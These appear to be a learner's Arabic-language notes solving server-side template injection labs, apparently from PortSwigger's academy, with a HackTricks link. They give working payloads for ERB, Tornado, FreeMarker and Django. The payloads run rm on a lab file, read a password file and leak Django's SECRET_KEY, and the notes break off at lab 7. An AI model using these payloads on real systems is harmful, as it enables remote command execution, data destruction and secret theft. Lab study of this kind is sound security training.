

ده موقه تبحث باسم ال templet ويجيب ال payload
https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html   

---

1)  Lab: Basic server-side template injection 
	 انتا الاول هتجرب وهتشوف ال method  وتشوف فيه ثغره ولا ايه وهتلاقى فيه هو هنا عاوز يحذف ملف وهتشوف براميتر وهتلاقيه اسمه massage  وهتكتب فيه ده  
	 payload => <%=+system("rm+/home/carlos/morale.txt") %> 
---
2) Lab: Basic server-side template injection (code context) 
	 انتا هنا هتسجل دخول بالاكونت وبعدين تعمل you can select whether you want the site to use your full name, first name, or nickname   وبعدين تستقبل الطلب فى البيرب وفى blog-post-author-display تكتب ال ال نتا عاوزه   
	 payload => }}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')  
--- 
3)  Lab: Server-side template injection using documentation 
	 هنا هتسجل اكونت عادى وتروح عل اى بوست  وهتلاقى تحت Edit templet  هتدخل وتشوف اللغه وهو هنا الثغره لو كتبت حاجه هتتنفذ 
	 payload => <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") } 
---
4)  Lab: Server-side template injection in an unknown language with a documented exploit
	 هتلاقى باراميتر اسمه message وده بيقبل وهتجرب لحد ما تعرف نوعه وتبعث بانوع فى الموقع ال فوق وخلاص 
---
5)    # Lab: Server-side template injection with information disclosure via user-supplied objects
	- نعمل **Invalid Syntax** → من الـError نعرف إن الـEngine هو **Django**.
	- نستخدم:
	    ```django
	    {% debug %}
	    ```
	    → نكتشف الـobjects المتاحة، ومنها `settings`.
	- نستخدم:
	    ```django
	    {{settings.SECRET_KEY}}
	    ```
	    → نكشف الـ`SECRET_KEY`.
	- ننسخ الـKey ونضعه في **Submit solution**.
	**Attack Chain:**  
	`SSTI → Django → debug → settings → SECRET_KEY → Information Disclosure`
	 
---
6) Lab: Server-side template injection in a sandboxed environment
	انتا هتسجل حساب وبعدين تشوف نوع الموديل وتدور على البى لود من الموقع وتكتب بدل ال id تكتب 
	cat /home/carlos/my_password.txt    
	غيّرت `article` إلى `product`   
---
7)  Lab: Server-side template injection with a custom exploit
	 h